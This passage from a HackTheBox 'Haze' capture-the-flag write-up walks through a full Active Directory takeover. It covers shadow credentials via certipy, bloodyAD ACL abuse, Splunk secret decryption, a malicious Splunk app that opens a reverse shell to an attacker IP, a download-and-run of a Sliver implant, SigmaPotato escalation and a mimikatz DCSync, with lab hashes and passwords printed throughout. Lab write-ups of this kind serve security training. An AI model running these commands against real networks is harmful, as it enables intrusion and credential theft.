└─$ certipy-ad shadow auto -u 'Haze-IT-Backup$@haze.htb' -hashes '735c02c6b2dc54c3c8c6891f55279ebc' -target 'dc01.haze.htb' -dc-ip 10.129.221.84 -account 'edward.martin'
Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
[*] Targeting user 'edward.martin'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '32d96cda-81fb-152e-7bdf-d8e64150fb8f'
[*] Adding Key Credential with device ID '32d96cda-81fb-152e-7bdf-d8e64150fb8f' to the Key Credentials for 'edward.martin'
[*] Successfully added Key Credential with device ID '32d96cda-81fb-152e-7bdf-d8e64150fb8f' to the Key Credentials for 'edward.martin'
[*] Authenticating as 'edward.martin' with the certificate
[*] Using principal: edward.martin@haze.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'edward.martin.ccache'
[*] Trying to retrieve NT hash for 'edward.martin'
[*] Restoring the old Key Credentials for 'edward.martin'
[*] Successfully restored the old Key Credentials for 'edward.martin'
[*] NT hash for 'edward.martin': 09e0b3eeb2e7a6b0d419e9ff8f4d91af
```

### Shell as edward.martin

I can now connect to the machine via **WinRM** as **`edward.martin`** and access the **`C:\Backups`** directory, which I had identified earlier. While I could use WinRM’s built-in download function, in this case I opted to **stand up an SMB server** to transfer the archive more conveniently.

```python
┌──(sn0x㉿sn0x)-[~/hackthebox/HAZE]
└─$ smbserver.py -smb2support "loot" loot
 
edward.martin@haze$ copy splunk_backup_2024-08-06.zip \\10.10.14.84\loot
```

After extracting the archive, I search for **encrypted passwords** again, similar to my initial enumeration earlier in the box. Now that I know the patterns to look for, I can use a **more precise regex** to locate them efficiently (although a simpler search for “passw” would have found all of them as well).

```python
$ find . -name '*.conf' -exec grep -rP '\$\d\$' {} ';'
pass4SymmKey = $7$u538ChVu1V7V9pXEWterpsj8mxzvVORn8UdnesMP0CHaarB03fSbow==
sslPassword = $7$C4l4wOYleflCKJRL9l/lBJJQEBeO16syuwmsDCwft11h7QPjPH8Bog==
bindDNpassword = $1$YDz8WfhoCWmf6aTRkA+QqUI=
```

However, unlike before, I now need to use the **`splunk-legacy-decrypt`** function, since the password starting with `$1$` is in the **legacy format**. After decrypting the password, I also verify which **user account** it belongs to.

```python
$ splunksecrets splunk-legacy-decrypt -S etc/auth/splunk.secret --ciphertext '$1$YDz8WfhoCWmf6aTRkA+QqUI='
Sp1unkadmin@2k24
 
$ cat etc/passwd
:admin:$6$8FRibWS3pDNoVWHU$vTW2NYea7GiZoN0nE6asP6xQsec44MlcK2ZehY5RC4xeTAz4kVVcbCkQ9xBI2c7A8VPmajczPOBjcVgccXbr9/::Administrator:admin:changeme@example.com:::19934
```

With this password I can now log into the Splunk instance as an administrator user.

<figure><img src="../../../../.gitbook/assets/image (179).png" alt=""><figcaption></figcaption></figure>

While looking through the **BloodHound** data collected with `mark.adams` I’ve noticed some accounts missing that were present in the `rid-brute`. Therefore I run the collection again with the `HAZE-IT-BACKUP$` account by providing the hash `84D6A733D85D9E03F46EBA25B34517A9`.

```python
┌──(sn0x㉿sn0x)-[~/hackthebox/HAZE]
└─$ bloodhound-ce-python -d haze.htb \
                       -dc dc01.haze.htb \
                       -u 'HAZE-IT-BACKUP$' \
                       --hashes :84D6A733D85D9E03F46EBA25B34517A9 \
                       -c ALL \
                       --zip \
                       -ns 10.129.232.50
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: haze.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.haze.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.haze.htb
INFO: Found 9 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.haze.htb
INFO: Done in 00M 05S
INFO: Compressing output into 20250518165100_bloodhound.zip
 
```

After importing the new data into **BloodHound**, a **new edge** to **`edward.martin`** becomes visible. The service account has the ability to **modify the owner** of the **`SUPPORT_SERVICES`** group, effectively adding itself, and can then use **Shadow Credentials** to escalate privileges to the **`edward.martin`** account.

<figure><img src="../../../../.gitbook/assets/image (181).png" alt=""><figcaption></figcaption></figure>

First, I **change the owner** of the **`SUPPORT_SERVICES`** group from `HAZE-IT-BACKUP$` to **`bloodyAD`**. This lets me grant **`GenericAll`** permissions and then **add the account** back into the group itself.

```python
$ bloodyAD --host 'dc01.haze.htb' \
           -d 'haze.htb' \
           -u 'haze-it-backup$' \
           -p ':84D6A733D85D9E03F46EBA25B34517A9' \
           set owner 'SUPPORT_SERVICES' 'HAZE-IT-BACKUP$'
[+] Old owner S-1-5-21-323145914-28650650-2368316563-512 is now replaced by HAZE-IT-BACKUP$ on SUPPORT_SERVICES
 
$ bloodyAD --host 'dc01.haze.htb' \
           -d 'haze.htb' \
           -u 'haze-it-backup$' \
           -p ':84D6A733D85D9E03F46EBA25B34517A9' \
           add genericAll 'SUPPORT_SERVICES' 'HAZE-IT-BACKUP$'
[+] HAZE-IT-BACKUP$ has now GenericAll on SUPPORT_SERVICES
 
$ bloodyAD --host 'dc01.haze.htb' \
           -d 'haze.htb' \
           -u 'haze-it-backup$' \
           -p ':84D6A733D85D9E03F46EBA25B34517A9' \
           add groupMember 'SUPPORT_SERVICES' 'HAZE-IT-BACKUP$'
[+] HAZE-IT-BACKUP$ added to SUPPORT_SERVICES
```

Next I’ll use [certipy](https://github.com/ly4k/Certipy) to automatically add new shadow credentials, retrieve the NTLM hash for `edward.martin` and then remove the credential link again. Since this interaction relies on **Kerberos** I fake the time because the **Domain Controller** is 8 hours ahead. I obtain the hash `09e0b3eeb2e7a6b0d419e9ff8f4d91af` and can use it to execute my **Sliver** payload on the host.

```python
┌──(sn0x㉿sn0x)-[~/hackthebox/HAZE]
└─$ faketime -f +8h certipy-ad shadow \
                             -account edward.martin \
                             -u 'haze-it-backup$@haze.htb' \
                             -hashes ':84D6A733D85D9E03F46EBA25B34517A9' \
                             auto
Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
[*] Targeting user 'edward.martin'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '3cbf0790-5401-d10c-82e3-4dd7620c139d'
[*] Adding Key Credential with device ID '3cbf0790-5401-d10c-82e3-4dd7620c139d' to the Key Credentials for 'edward.martin'
[*] Successfully added Key Credential with device ID '3cbf0790-5401-d10c-82e3-4dd7620c139d' to the Key Credentials for 'edward.martin'
[*] Authenticating as 'edward.martin' with the certificate
[*] Using principal: edward.martin@haze.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'edward.martin.ccache'
[*] Trying to retrieve NT hash for 'edward.martin'
[*] Restoring the old Key Credentials for 'edward.martin'
[*] Successfully restored the old Key Credentials for 'edward.martin'
[*] NT hash for 'edward.martin': 09e0b3eeb2e7a6b0d419e9ff8f4d91af
```

<br>

### Shell as Alexander.green

```python
sliver (edward.martin) > sa-whoami                                                                     
[*] Successfully executed sa-whoami (coff-loader)                                                                                                                                                                                            
[*] Got output:
 
UserName                SID
====================== ==================================== 
HAZE\edward.martin      S-1-5-21-323145914-28650650-2368316563-1105
 
 
GROUP INFORMATION                                 Type                     SID                                          Attributes               
================================================= ===================== ============================================= ==================================================
HAZE\Domain Users                                 Group                    S-1-5-21-323145914-28650650-2368316563-513    Mandatory group, Enabled by default, Enabled group, 
Everyone                                          Well-known group         S-1-1-0                                       Mandatory group, Enabled by default, Enabled group, 
BUILTIN\Remote Management Users                   Alias                    S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group, 
BUILTIN\Users                                     Alias                    S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group, 
BUILTIN\Pre-Windows 2000 Compatible Access        Alias                    S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group, 
BUILTIN\Certificate Service DCOM Access           Alias                    S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group, 
NT AUTHORITY\NETWORK                              Well-known group         S-1-5-2                                       Mandatory group, Enabled by default, Enabled group, 
NT AUTHORITY\Authenticated Users                  Well-known group         S-1-5-11                                      Mandatory group, Enabled by default, Enabled group, 
NT AUTHORITY\This Organization                    Well-known group         S-1-5-15                                      Mandatory group, Enabled by default, Enabled group, 
HAZE\Backup_Reviewers                             Group                    S-1-5-21-323145914-28650650-2368316563-1109   Mandatory group, Enabled by default, Enabled group, 
NT AUTHORITY\NTLM Authentication                  Well-known group         S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group, 
Mandatory Label\Medium Plus Mandatory Level       Label                    S-1-16-8448                                   Mandatory group, Enabled by default, Enabled group, 
 
 
Privilege Name                Description                                       State                         
============================= ================================================= ===========================
SeMachineAccountPrivilege     Add workstations to domain                        Enabled                       
SeChangeNotifyPrivilege       Bypass traverse checking                          Enabled                       
SeIncreaseWorkingSetPrivilege Increase a process working set                    Enabled
```

The user **`edward.martin`** belongs to the **Backup Reviewers** group. I quickly locate the **`Backups`** folder at the root of the C: drive, which contains a **Splunk backup**. I download the archive to my machine using **Sliver**.

```python
sliver (edward.martin) > download /Backups/splunk/splunk_backup_2024-08-06.zip splunk_backup_2024-08-06.zip
 
[*] Wrote 27445566 bytes (1 file successfully, 0 files unsuccessfully) to splunk_backup_2024-08-06.zip
```

Repeating the steps from the beginning and checking out the stored authentication material in the backup finds another bind user called `alexander.green` and its encrypted password.

```
/Splunk/var/run/splunk/confsnapshot/baseline_local/system/local/authentication.conf
[default]
 
minPasswordLength = 8
minPasswordUppercase = 0
minPasswordLowercase = 0
minPasswordSpecial = 0
minPasswordDigit = 0
 
 
[Haze LDAP Auth]
 
SSLEnabled = 0
anonymous_referrals = 1
bindDN = CN=alexander.green,CN=Users,DC=haze,DC=htb
bindDNpassword = $1$YDz8WfhoCWmf6aTRkA+QqUI=
charset = utf8
emailAttribute = mail
enableRangeRetrieval = 0
groupBaseDN = CN=Splunk_Admins,CN=Users,DC=haze,DC=htb
groupMappingAttribute = dn
groupMemberAttribute = member
groupNameAttribute = cn
host = dc01.haze.htb
nestedGroups = 0
network_timeout = 20
pagelimit = -1
port = 389
realNameAttribute = cn
sizelimit = 1000
timelimit = 15
userBaseDN = CN=Users,DC=haze,DC=htb
userNameAttribute = samaccountname
 
[authentication]
authSettings = Haze LDAP Auth
authType = LDAP

```

Another `splunk.secret` was used to encrypt the string but luckily it’s also part of the archived data.

```
CgL8i4HvEen3cCYOYZDBkuATi5WQuORBw9g4zp4pv5mpMcMF3sWKtaCWTX8Kc1BK3pb9HR13oJqHpvYLUZ.gIJIuYZCA/YNwbbI4fDkbpGD.8yX/8VPVTG22V5G5rDxO5qNzXSQIz3NBtFE6oPhVLAVOJ0EgCYGjuk.fgspXYUc9F24Q6P/QGB/XP8sLZ2h00FQYRmxaSUTAroHHz8fYIsChsea7GBRaolimfQLD7yWGefscTbuXOMJOrzr/6B
```

Once again using **splunksecrets** I recover the password `Sp1unkadmin@2k24` but the password is not valid _anymore_ for the specified account.

```
$ splunksecrets splunk-decrypt --splunk-secret splunk.secret.bakCiphertext: $1$YDz8WfhoCWmf6aTRkA+QqUI=Sp1unkadmin@2k24
```

It does grant me access as `admin` to the **Splunk** interface on `http://dc01.haze.htb:8000` though.

<figure><img src="../../../../.gitbook/assets/image (183).png" alt=""><figcaption></figcaption></figure>

As **Administrator**, I have the ability to install new apps. I choose an app called **`reverse_shell_splunk`**, which executes a reverse shell immediately after installation. I **clone the repository**, update the PowerShell script with my **attacker IP and port**, and then **build the SPL file** following the instructions in the repository’s README

```python
┌──(sn0x㉿sn0x)-[~/hackthebox/HAZE]
└─$ git clone https://github.com/0xjpuff/reverse_shell_splunk & cd reverse_shell_splunk
$ sed -i \
      -e 's#attacker_ip_here#10.10.10.10#g' \
      -e 's#attacker_port_here#4444#g' \
      reverse_shell_splunk/bin/run.ps1
      
┌──(sn0x㉿sn0x)-[~/hackthebox/HAZE]
└─$ tar -cvzf reverse_shell_splunk.tgz reverse_shell_splunk
reverse_shell_splunk/
reverse_shell_splunk/default/
reverse_shell_splunk/default/inputs.conf
reverse_shell_splunk/bin/
reverse_shell_splunk/bin/rev.py
reverse_shell_splunk/bin/run.ps1
reverse_shell_splunk/bin/run.bat

┌──(sn0x㉿sn0x)-[~/hackthebox/HAZE]
└─$ mv reverse_shell_splunk.tgz reverse_shell_splunk.spl

```

I go to **Apps → Manage Apps → Install app from file**, select the **generated SPL file**, and upload it. Before installing, I make sure to **start my local listener** to catch the incoming reverse shell.

<figure><img src="../../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

Right after clicking the button there’s a callback as `alexander.green` and I use this shell to run my **Sliver** payload.

```python
┌──(sn0x㉿sn0x)-[~/hackthebox/HAZE]
└─$ rlwrap -cAr nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.174] from (UNKNOWN) [10.129.232.50] 50611
 
PS C:\Windows\system32> mkdir \tools
 
 
    Directory: C:\
 
 
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         5/18/2025   4:29 PM                tools
 
 
PS C:\Windows\system32> iwr http://10.10.14.174/haze.exe -useba -outfile C:\tools\r.exe
PS C:\Windows\system32> & C:\tools\r.exe
```

### Shell as SYSTEM

Noticing the privileges of the account **alexander.green**, the **SeImpersonatePrivilege** catches my attention. I can exploit this to escalate my privileges to **SYSTEM**

```
sliver (alexander.green) > getprivs
 
Privilege Information for r.exe (PID: 5048)
-------------------------------------------
 
Process Integrity Level: High
 
Name                            Description                                     Attributes
====                            ===========                                     ==========
SeMachineAccountPrivilege       Add workstations to domain                      Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                        Enabled, Enabled by Default
SeImpersonatePrivilege          Impersonate a client after authentication       Enabled, Enabled by Default
SeCreateGlobalPrivilege         Create global objects                           Enabled, Enabled by Default
SeIncreaseWorkingSetPrivilege   Increase a process working set                  Disabled
```

Using my Sliver session, I run **SigmaPotato** and invoke the Sliver binary I had uploaded earlier. This spawns a new session as **SYSTEM**, allowing me to retrieve the final flag.

```python
sliver (alexander.green) > execute-assembly -t 5 -- /home/sn0x/tools/potato/SigmaPotato/SigmaPotato.exe C:\\tools\\r.exe
 
[!] rpc error: code = Unknown desc = implant timeout
[*] Session 0000... haze - 10.129.232.50:50695 (dc01) - windows/amd64
 
sliver (alexander.green) > use 0000...
 
sliver (SYSTEM) > sa-whoami
 
[*] Successfully executed sa-whoami (coff-loader)
[*] Got output:
 
UserName                SID
====================== ====================================
HAZE\DC01$      S-1-5-18
 
 
GROUP INFORMATION                                 Type                     SID                                          Attributes
================================================= ===================== ============================================= ==================================================
Mandatory Label\System Mandatory Level            Label                    S-1-16-16384                                  Mandatory group, Enabled by default, Enabled group,
Everyone                                          Well-known group         S-1-1-0                                       Mandatory group, Enabled by default, Enabled group,
BUILTIN\Users                                     Alias                    S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group,
BUILTIN\Certificate Service DCOM Access           Alias                    S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group,
BUILTIN\Pre-Windows 2000 Compatible Access        Alias                    S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\SERVICE                              Well-known group         S-1-5-6                                       Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\Authenticated Users                  Well-known group         S-1-5-11                                      Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\This Organization                    Well-known group         S-1-5-15                                      Mandatory group, Enabled by default, Enabled group,
NT SERVICE\BrokerInfrastructure                   Well-known group         S-1-5-80-1988685059-1921232356-378231328-2704142597-890457928 Enabled by default, Enabled group, Group owner,
NT SERVICE\DcomLaunch                             Well-known group         S-1-5-80-1601830629-990752416-3372939810-977361409-3075122917 Enabled by default, Enabled group, Group owner,
NT SERVICE\DeviceInstall                          Well-known group         S-1-5-80-2659457741-469498900-3203170401-3149177360-3048467625 Enabled by default, Group owner,
NT SERVICE\LSM                                    Well-known group         S-1-5-80-1230977110-1477712667-2747199032-477530733-939374687 Enabled by default, Group owner,
NT SERVICE\PlugPlay                               Well-known group         S-1-5-80-1981970923-922788642-3535304421-2999920573-318732269 Enabled by default, Enabled group, Group owner,
NT SERVICE\Power                                  Well-known group         S-1-5-80-2343416411-2961288913-598565901-392633850-2111459193 Enabled by default, Enabled group, Group owner,
NT SERVICE\SystemEventsBroker                     Well-known group         S-1-5-80-1662832393-3268938575-4001313665-1200257238-783911988 Enabled by default, Group owner,
LOCAL                                             Well-known group         S-1-2-0                                       Mandatory group, Enabled by default, Enabled group,
BUILTIN\Administrators                            Alias                    S-1-5-32-544                                  Enabled by default, Enabled group, Group owner,
 
 
Privilege Name                Description                                       State
============================= ================================================= ===========================
SeAssignPrimaryTokenPrivilege Replace a process level token                     Disabled
SeLockMemoryPrivilege         Lock pages in memory                              Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process                Disabled
SeTcbPrivilege                Act as part of the operating system               Enabled
SeSecurityPrivilege           Manage auditing and security log                  Disabled
SeTakeOwnershipPrivilege      Take ownership of files or other objects          Disabled
SeLoadDriverPrivilege         Load and unload device drivers                    Disabled
SeSystemProfilePrivilege      Profile system performance                        Enabled
SeSystemtimePrivilege         Change the system time                            Disabled
SeProfileSingleProcessPrivilegeProfile single process                            Enabled
SeIncreaseBasePriorityPrivilegeIncrease scheduling priority                      Enabled
SeCreatePagefilePrivilege     Create a pagefile                                 Enabled
SeCreatePermanentPrivilege    Create permanent shared objects                   Enabled
SeBackupPrivilege             Back up files and directories                     Disabled
SeRestorePrivilege            Restore files and directories                     Disabled
SeShutdownPrivilege           Shut down the system                              Disabled
SeDebugPrivilege              Debug programs                                    Enabled
SeAuditPrivilege              Generate security audits                          Enabled
SeSystemEnvironmentPrivilege  Modify firmware environment values                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                          Enabled
SeUndockPrivilege             Remove computer from docking station              Disabled
SeManageVolumePrivilege       Perform volume maintenance tasks                  Disabled
SeImpersonatePrivilege        Impersonate a client after authentication         Enabled
SeCreateGlobalPrivilege       Create global objects                             Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                    Enabled
SeTimeZonePrivilege           Change the time zone                              Enabled
SeCreateSymbolicLinkPrivilege Create symbolic links                             Enabled
SeDelegateSessionUserImpersonatePrivilegeObtain an impersonation token for another user in the same sessionEnabled
```

Got Root !

## MIMIKATZ METHOD

### SeImpersonate <a href="#seimpersonate" id="seimpersonate"></a>

After uploading, at least one Sliver beacon connects back to my C2. Checking the user’s privileges shows **SeImpersonatePrivilege**, which is a straightforward way to escalate to SYSTEM

```python
operator@sliver$ getprivs
 
Privilege Information for svchost.exe (PID: 2020)
-------------------------------------------------
 
Process Integrity Level: High
 
Name                            Description                                     Attributes
====                            ===========                                     ==========
SeMachineAccountPrivilege       Add workstations to domain                      Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                        Enabled, Enabled by Default
SeImpersonatePrivilege          Impersonate a client after authentication       Enabled, Enabled by Default
SeCreateGlobalPrivilege         Create global objects                           Enabled, Enabled by Default
SeIncreaseWorkingSetPrivilege   Increase a process working set                  Disabled
```

To get a SYSTEM-level Beacon, I first transfer a Sliver executable to the machine and run it via **SigmaPotato**:

```bash
operator@sliver$ execute-assembly SigmaPotato.exe "C:\ProgramData\ETHICAL_BLIZZARD.exe"
```

After this, I tried dumping the Domain Administrator’s NT hash, but it initially failed. I suspect this happened because spawning Sliver through SigmaPotato caused the Beacon to be partially unstable.

```python
operator@sliver$ mimikatz -t 120  "\"lsadump::dcsync /user:Administrator\"" "exit"
 
[!] Could not load extension: rpc error: code = Unknown desc = Error building import table: Error loading module: A dynamic link library (DLL) initialization routine failed.
```

As a workaround, now that I also had **SeDebugPrivilege**, I used **Potato-Beacon** to run the built-in **getsystem**. This leverages SeDebugPrivilege to spawn a fully functional SYSTEM Beacon, from which I could successfully **DCSync** the Domain Administrator’s NT hash.

```python
operator@sliver$ mimikatz "\"lsadump::dcsync /user:Administrator\"" "exit"
 
[*] Successfully executed mimikatz
[*] Got output:
 
  .#####.   mimikatz 2.2.0 (x64) #19041 May 17 2024 22:19:06
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
 
mimikatz(commandline) # lsadump::dcsync /user:Administrator
[DC] 'haze.htb' will be the domain
[DC] 'dc01.haze.htb' will be the DC server
[DC] 'Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
 
Object RDN           : Administrator
 
** SAM ACCOUNT **
 
SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 3/20/2025 2:34:49 PM
Object Security ID   : S-1-5-21-323145914-28650650-2368316563-500
Object Relative ID   : 500
 
Credentials:
  Hash NTLM: 06dc954d32cb91ac2831d67e3e12027f
    ntlm- 0: 06dc954d32cb91ac2831d67e3e12027f
    ntlm- 1: 060222100e2edc0a5e173b4027d0d7ae
    lm  - 0: 7a67f9a840029ea3ee20148e0751b022
 
[...]
```

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
